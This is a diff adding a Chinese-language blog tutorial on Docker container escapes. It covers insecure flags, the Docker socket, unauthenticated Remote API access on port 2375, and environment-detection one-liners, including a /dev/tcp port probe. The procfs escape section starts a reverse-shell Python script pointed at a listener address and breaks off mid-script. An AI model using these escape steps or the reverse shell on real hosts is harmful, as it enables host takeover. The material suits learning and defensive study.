@@ -1,0 +1,664 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+  <meta charset="UTF-8" />
+  <title>Docker逃逸 | 雲流のLowest World</title>
+  <meta name="author" content="C1oudfL0w0" />
+  <meta name="description" content="" />
+  <meta name="keywords" content="" />
+  <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+  <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+  <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/js/lib/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/js/lib/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/js/lib/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/js/lib/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+  <!--flag{never_g0nna g1ve_you up}-->
+
+  <!-- 页面点击特效 -->
+  <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+  <!-- 浏览器标题 -->
+  <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+  <!-- 动态背景 -->
+  
+
+  <!--文章目录-->
+  
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="toc-number">2.</span> <span class="toc-text">攻击面</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B4%BB%E5%8A%A8%E4%B8%AD%E7%9A%84%E5%AE%B9%E5%99%A8"><span class="toc-number">2.1.</span> <span class="toc-text">活动中的容器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%B9%E5%99%A8%E7%AE%A1%E7%90%86%E7%A8%8B%E5%BA%8F%E6%8E%A5%E5%8F%A3"><span class="toc-number">2.2.</span> <span class="toc-text">容器管理程序接口</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UNIX-socket"><span class="toc-number">2.2.1.</span> <span class="toc-text">UNIX socket</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP-socket"><span class="toc-number">2.2.2.</span> <span class="toc-text">TCP socket</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">2.3.</span> <span class="toc-text">其他</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%A3%80%E6%B5%8B"><span class="toc-number">3.</span> <span class="toc-text">环境检测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%85%8D%E7%BD%AE"><span class="toc-number">3.1.</span> <span class="toc-text">不安全的配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%A3%80%E6%B5%8B"><span class="toc-number">3.2.</span> <span class="toc-text">内核检测</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8C%82%E8%BD%BD%E5%AE%BF%E4%B8%BB%E6%9C%BA-procfs-%E9%80%83%E9%80%B8"><span class="toc-number">4.</span> <span class="toc-text">挂载宿主机 procfs 逃逸</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8C%82%E8%BD%BD-Docker-Socket-%E9%80%83%E9%80%B8"><span class="toc-number">5.</span> <span class="toc-text">挂载 Docker Socket 逃逸</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privileged-%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8"><span class="toc-number">6.</span> <span class="toc-text">Privileged 特权模式容器逃逸</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Docker-%E8%BF%9C%E7%A8%8B-API-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E9%80%83%E9%80%B8"><span class="toc-number">7.</span> <span class="toc-text">Docker 远程 API 未授权访问逃逸</span></a></li></ol>
+    </div>
+    <script>
+    (function () {
+        function initTocHighlight() {
+            var tocLinks = document.querySelectorAll('#toc .toc-link');
+            if (!tocLinks.length) return;
+
+            // 收集所有标题锚点对应的 DOM 元素
+            var headings = [];
+            tocLinks.forEach(function (link) {
+                var href = link.getAttribute('href');
+                if (!href) return;
+                var id = decodeURIComponent(href.slice(1));
+                var el = document.getElementById(id);
+                if (el) headings.push({ el: el, link: link });
+            });
+            if (!headings.length) return;
+
+            var activeLink = null;
+            var offset = 80;
+
+            function highlight() {
+                var scrollTop = window.pageYOffset || document.documentElement.scrollTop;
+                var current = null;
+
+                for (var i = 0; i < headings.length; i++) {
+                    if (headings[i].el.getBoundingClientRect().top <= offset + 10) {
+                        current = headings[i];
+                    }
+                }
+
+                // 仅在用户确实滚动过、且到达页面底部时，才强制高亮最后一个
+                if (scrollTop > 100 && window.innerHeight + scrollTop >= document.documentElement.scrollHeight - 50) {
+                    current = headings[headings.length - 1];
+                }
+
+                // 页面顶部且没有标题进入视口时，高亮第一个
+                if (scrollTop == 0) {
+                    current = headings[0];
+                }
+
+                if (current && current.link !== activeLink) {
+                    // 清除所有高亮
+                    tocLinks.forEach(function (link) {
+                        link.classList.remove('toc-active');
+                    });
+
+                    // 高亮当前项
+                    current.link.classList.add('toc-active');
+                    activeLink = current.link;
+
+                    // TOC 容器自动滚动，使当前项可见
+                    var tocEl = document.getElementById('toc');
+                    var linkRect = activeLink.getBoundingClientRect();
+                    var tocRect = tocEl.getBoundingClientRect();
+                    if (linkRect.top < tocRect.top || linkRect.bottom > tocRect.bottom) {
+                        activeLink.scrollIntoView({ block: 'center', behavior: 'smooth' });
+                    }
+                } else if (!current && activeLink) {
+                    tocLinks.forEach(function (link) {
+                        link.classList.remove('toc-active');
+                    });
+                    activeLink = null;
+                }
+            }
+
+            var ticking = false;
+            window.addEventListener('scroll', function () {
+                if (!ticking) {
+                    requestAnimationFrame(function () {
+                        highlight();
+                        ticking = false;
+                    });
+                    ticking = true;
+                }
+            });
+
+            // 初始高亮
+            highlight();
+        }
+
+        // 等待页面完全加载后再初始化（确保文章标题 DOM 已渲染）
+        if (document.readyState === 'complete') {
+            initTocHighlight();
+        } else {
+            window.addEventListener('load', initTocHighlight);
+        }
+    })();
+    </script>
+  
+
+  <!--返回顶部-->
+  <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+    <a title="返回顶部">↑</a>
+  </div>
+  <script src="/blog/js/totop.js"></script>
+
+  <div id="layout">
+    
+    <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+    
+    <transition name="fade">
+      <div id="loading" v-show="loading">
+        <div id="loading-circle">
+          <h2>LOADING</h2>
+          <p>第一次加载文章图片可能会花费较长时间</p>
+          <p>要不挂个梯子试试？（x</p>
+          <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+          <img src="/blog/images/loading.gif" />
+        </div>
+      </div>
+    </transition>
+    <transition name="into">
+      <div id="main" v-show="!loading">
+        <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+        <div class="article">
+    <div>
+        <h1>Docker逃逸</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2026/2/11
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/%E4%BA%91%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                云安全
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/Docker/" style="color: #03a9f4">Docker</a>
+            </span>
+            
+        </span>
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">2.4k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">10分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://wiki.teamssix.com/CloudNative/Docker/docker-escape-vulnerability-summary.html">https://wiki.teamssix.com/CloudNative/Docker/docker-escape-vulnerability-summary.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://treasure-house.randark.site/docs/DevSecOps/Containerization/Docker/Docker-Remote-API">https://treasure-house.randark.site/docs/DevSecOps/Containerization/Docker/Docker-Remote-API</a></p>
+<span id="more"></span>
+
+<hr>
+<h1 id="攻击面"><a href="#攻击面" class="headerlink" title="攻击面"></a>攻击面</h1><h2 id="活动中的容器"><a href="#活动中的容器" class="headerlink" title="活动中的容器"></a>活动中的容器</h2><p>不受限制的资源共享：容器运行在宿主机上，容器必然要使用宿主机的各种 CPU、内存等资源，如果没有对容器进行资源使用限制，那么就存在宿主机被资源耗尽的风险。</p>
+<p>不安全的配置与挂载：</p>
+<p>如果为容器设定了不安全的配置，会导致容器本身的隔离机制失效，容器的两大隔离机制如下：</p>
+<ul>
+<li>Linux 命名空间（NameSpace）：实现文件系统、网络、进程、主机名等方面的隔离</li>
+<li>Linux 控制组（cgroups）：实现 CPU、内存、硬盘等方面的隔离</li>
+</ul>
+<p>如果设定了以下配置就会导致相应的隔离机制失效：</p>
+<ul>
+<li><code>--privileged</code>：使容器内的 root 权限和宿主机上的 root 权限一致，权限隔离被打破</li>
+<li><code>--net=host</code>：使容器与宿主机处于同一网络命名空间，网络隔离被打破</li>
+<li><code>--pid=host</code>：使容器与宿主机处于同一进程命令空间，进程隔离被打破</li>
+<li><code>--volume /:/host</code>：宿主机根目录被挂载到容器内部，文件系统隔离被打破</li>
+</ul>
+<hr>
+<h2 id="容器管理程序接口"><a href="#容器管理程序接口" class="headerlink" title="容器管理程序接口"></a>容器管理程序接口</h2><p>Docker daemon 是 Docker 引擎的守护进程，也称为 Dockerd。它是一个长时间运行的进程，负责管理 Docker 镜像、容器、网络和存储等各种资源，并提供一个 API 以供 Docker 客户端进行交互</p>
+<p>Docker daemon 是仅针对 Linux 的，但是在 Windows 上和 Mac 上，可以通过兼容层的方式来运行Docker daemon。Docker daemon 通过典型安装途径安装之后，应该由 systemctl 自动管理，而不需要由用户来控制 Docker daemon 的行为</p>
+<p>Docker daemon 在同一主机上仅支持存在一个 Docker daemon 实例，在默认 systemctl 运行了 Docker daemon 的情况下，无法再手动控制 Docker daemon（dockerd）的启动参数，需要在修改后重启实例</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl daemon-reload
+systemctl restart <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>Docker 守护进程主要监听 UNIX socket 和 TCP socket，默认情况下，Docker 只会监听 UNIX socket</p>
+<h3 id="UNIX-socket"><a href="#UNIX-socket" class="headerlink" title="UNIX socket"></a>UNIX socket</h3><p><code>unix:///var/run/docker.sock</code>：<code>unix socket</code>，本地客户端将通过这个来连接 Docker Daemon</p>
+<p>UNIX socket 的风险主要在于 Docker 守护进程默认以宿主机的 root 权限运行，因此就可以借助这点进行提权或者容器逃逸</p>
+<ul>
+<li><p>普通用户被加到 Docker 用户组内：如果普通用户被加入到 Docker 用户组内，那么普通用户也将有权限访问 Docker UNIX socket，如果攻击者获得了这个普通用户权限，就可以借助 Docker 提权到 root 用户权限 —— 使用普通用户创建一个 privileged 为 true 的容器，在该容器内挂载宿主机硬盘并写入定时任务，然后将宿主机的 root 权限反弹回来</p>
+</li>
+<li><p>UNIX socket 挂载到容器内部：有时为了实现容器内部管理容器，可能会将 Docker UNIX socket 挂载到容器内部，那么如果该容器被入侵，我们就可以借助这个 socket 进行容器逃逸获得宿主机 root 权限</p>
+</li>
+</ul>
+<hr>
+<h3 id="TCP-socket"><a href="#TCP-socket" class="headerlink" title="TCP socket"></a>TCP socket</h3><p>Docker Remote API 是一个取代远程命令行界面（rcli）的 REST API，其默认绑定 2375 端口</p>
+<p>Docker Remote API 常见端口：</p>
+<table>
+<thead>
+<tr>
+<th>端口</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>2375</td>
+<td>未加密的 docker socket, 远程 root 无密码访问主机</td>
+</tr>
+<tr>
+<td>2376</td>
+<td>tls 加密套接字, 很可能这是您的 CI 服务器 4243 端口作为 https 443 端口的修改</td>
+</tr>
+<tr>
+<td>2377</td>
+<td>群集模式套接字, 适用于群集管理器, 不适用于 docker 客户端</td>
+</tr>
+<tr>
+<td>5000</td>
+<td>docker 注册服务</td>
+</tr>
+<tr>
+<td>4789&#x2F;7946</td>
+<td>覆盖网络</td>
+</tr>
+</tbody></table>
+<p><code>tcp://0.0.0.0:2375</code>：<code>tcp socket</code>，表示允许任何远程客户端通过 2375 端口连接 Docker Daemon</p>
+<p>相关配置：修改 <code>/usr/lib/systemd/system/docker.service</code></p>
+<pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token comment"># 主要是在 [Service] 这个部分，添加 -H tcp://0.0.0.0:2375 配置远程访问</span>
+<span class="token section"><span class="token punctuation">[</span><span class="token section-name selector">Service</span><span class="token punctuation">]</span></span>
+<span class="token key attr-name">Type</span><span class="token punctuation">=</span><span class="token value attr-value">notify</span>
+<span class="token comment"># the default is not to use systemd for cgroups because the delegate issues still</span>
+<span class="token comment"># exists and systemd currently does not support the cgroup feature set required</span>
+<span class="token comment"># for containers run by docker</span>
+<span class="token key attr-name">ExecStart</span><span class="token punctuation">=</span><span class="token value attr-value">/usr/bin/dockerd -H fd:// -H tcp://0.0.0.0:2375 -H unix://var/run/docker.sock --containerd=/run/containerd/containerd.sock</span>
+<span class="token key attr-name">ExecReload</span><span class="token punctuation">=</span><span class="token value attr-value">/bin/kill -s HUP $MAINPID</span>
+<span class="token key attr-name">TimeoutSec</span><span class="token punctuation">=</span><span class="token value attr-value">0</span>
+<span class="token key attr-name">RestartSec</span><span class="token punctuation">=</span><span class="token value attr-value">2</span>
+<span class="token key attr-name">Restart</span><span class="token punctuation">=</span><span class="token value attr-value">always</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>或者修改 <code>/etc/docker/daemon.json</code> 的配置：</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+  <span class="token property">"hosts"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"tcp://0.0.0.0:2375"</span><span class="token punctuation">,</span><span class="token string">"unix:///var/run/docker.sock"</span><span class="token punctuation">]</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>（使用这种方式，需要去掉 <code>/usr/lib/systemd/system/docker.service</code> 中关于 -H 的选项，否则会报错，即只保留 <code>ExecStart=/usr/bin/dockerd --containerd=/run/containerd/containerd.sock</code>）</p>
+<p>开启之后查看端口监听：<code>ss -tunlp | grep docker</code></p>
+<p>风险显而易见，2375 端口无加密无认证，可以直接用 <code>docker -H</code> 接管目标容器</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token parameter variable">-H</span> tcp://<span class="token operator">&lt;</span>Server-IP<span class="token operator">></span>:2375 version
+<span class="token function">docker</span> <span class="token parameter variable">-H</span> tcp://<span class="token operator">&lt;</span>Server-IP<span class="token operator">></span>:2375 image <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>或者 http 请求 REST API：<a target="_blank" rel="noopener" href="https://docs.docker.com/engine/api/">Develop with Docker Engine API</a></p>
+<ul>
+<li>容器列表, 获取所有容器的清单：<code>GET /containers/json</code></li>
+<li>创建新容器, 命令如下：<code>POST /containers/create</code></li>
+<li>监控容器, 使用容器 id 获取该容器底层信息：<code>GET /containers/(id)/json</code></li>
+<li>进程列表, 获取容器内进程的清单：<code>GET /containers/(id)/top</code></li>
+<li>容器日志, 获取容器的标准输出和错误日志：<code>GET /containers/(id)/logs</code></li>
+<li>导出容器, 导出容器内容：<code>GET /containers/(id)/export</code></li>
+<li>启动容器, 如下：<code>POST /containers/(id)/start</code></li>
+<li>停止容器, 命令如下：<code>POST /containers/(id)/stop</code></li>
+<li>重启容器, 如下：<code>POST /containers/(id)/restart</code></li>
+<li>终止容器：<code>POST /containers/(id)/kill</code></li>
+</ul>
+<hr>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>默认情况下，容器内部的网络与宿主机是隔离的，但是每个容器之间是彼此互相连通的，理论上在容器之间是存在内网横向的</p>
+<p>容器通常与宿主机共享内核，也就是说如果宿主机内核存在漏洞，意味着容器可能也会存在相同的漏洞。<br>例如如果宿主机存在脏牛漏洞，那么拿到容器权限后，使用脏牛漏洞就可以获得宿主机权限，实现容器逃逸。</p>
+<p>软件自身漏洞：CVE-2019-14271、CVE-2019-5736 等</p>
+<hr>
+<h1 id="环境检测"><a href="#环境检测" class="headerlink" title="环境检测"></a>环境检测</h1><p>集成脚本： <a target="_blank" rel="noopener" href="https://github.com/teamssix/container-escape-check/blob/main/container-escape-check.sh">https://github.com/teamssix/container-escape-check/blob/main/container-escape-check.sh</a></p>
+<p>判断是否为容器环境：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /proc/1/cgroup <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-qi</span> <span class="token function">docker</span> <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> <span class="token string">"Is Docker"</span> <span class="token operator">||</span> <span class="token builtin class-name">echo</span> <span class="token string">"Not Docker"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="不安全的配置"><a href="#不安全的配置" class="headerlink" title="不安全的配置"></a>不安全的配置</h2><p>特权模式：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /proc/self/status <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-qi</span> <span class="token string">"0000003fffffffff"</span> <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> <span class="token string">"Is privileged mode"</span> <span class="token operator">||</span> <span class="token builtin class-name">echo</span> <span class="token string">"Not privileged mode"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>挂载 Docker Socket：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> /var/run/ <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-qi</span> docker.sock <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> <span class="token string">"Docker Socket is mounted."</span> <span class="token operator">||</span> <span class="token builtin class-name">echo</span> <span class="token string">"Docker Socket is not mounted."</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>挂载 procfs：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-name</span> core_pattern <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator">|</span> <span class="token function">wc</span> <span class="token parameter variable">-l</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-q</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> <span class="token string">"Procfs is mounted."</span> <span class="token operator">||</span> <span class="token builtin class-name">echo</span> <span class="token string">"Procfs is not mounted."</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>挂载宿主机根目录：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-name</span> <span class="token function">passwd</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> /etc/passwd <span class="token operator">|</span> <span class="token function">wc</span> <span class="token parameter variable">-l</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-q</span> ^1$<span class="token operator">&amp;&amp;</span><span class="token builtin class-name">echo</span> <span class="token string">"Root directory is not mounted."</span><span class="token operator">||</span> <span class="token builtin class-name">echo</span> <span class="token string">"Root directory is mounted."</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>Docker remote api 未授权访问：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">IP</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">hostname</span> <span class="token parameter variable">-i</span> <span class="token operator">|</span> <span class="token function">awk</span> -F. <span class="token string">'&#123;print $1 "." $2 "." $3 ".1"&#125;'</span> <span class="token variable">`</span></span> <span class="token operator">&amp;&amp;</span> <span class="token function">timeout</span> <span class="token number">3</span> <span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">"echo >/dev/tcp/<span class="token variable">$IP</span>/2375"</span> <span class="token operator">></span> /dev/null <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> <span class="token string">"Docker Remote API Is Enabled."</span> <span class="token operator">||</span> <span class="token builtin class-name">echo</span> <span class="token string">"Docker Remote API is Closed."</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这里获取 IP 的方式倒是值得一学 <code>hostname -i | awk -F. &#39;&#123;print $1 &quot;.&quot; $2 &quot;.&quot; $3 &quot;.1&quot;&#125;&#39;</code></p>
+<hr>
+<h2 id="内核检测"><a href="#内核检测" class="headerlink" title="内核检测"></a>内核检测</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">uname</span> <span class="token parameter variable">-r</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<hr>
+<h1 id="挂载宿主机-procfs-逃逸"><a href="#挂载宿主机-procfs-逃逸" class="headerlink" title="挂载宿主机 procfs 逃逸"></a>挂载宿主机 procfs 逃逸</h1><p>procfs是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多十分敏感重要的文件。因此，将宿主机的procfs挂载到不受控的容器中也是十分危险的，尤其是在该容器内默认启用root权限，且没有开启User Namespace时。</p>
+<p>找到当前容器在宿主机下的绝对路径</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /proc/mounts <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token parameter variable">-d</span> <span class="token string">','</span> <span class="token parameter variable">-n</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token function">grep</span> workdir
+<span class="token comment"># /var/lib/docker/overlay2/5717cb9154218ec49579ae338cd1c236694d6a377d61fd6d17e11e49d1b1baad/merged</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>安装 vim 和 gcc</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> update <span class="token parameter variable">-y</span> <span class="token operator">&amp;&amp;</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token function">vim</span> gcc <span class="token parameter variable">-y</span>
+<span class="token function">vim</span> /tmp/.t.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>创建一个反弹 shell 的 python 脚本</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/usr/bin/python3</span>
+<span class="token function">import</span> os
+<span class="token function">import</span> pty
+<span class="token function">import</span> socket
+lhost <span class="token operator">=</span> <span class="token string">"172.16.214.1"</span>
+lport <span class="token operator">=</span> <span class="token number">4444</span>
+def main<span class="token punctuation">(</span><span class="token punctuation">)</span>:
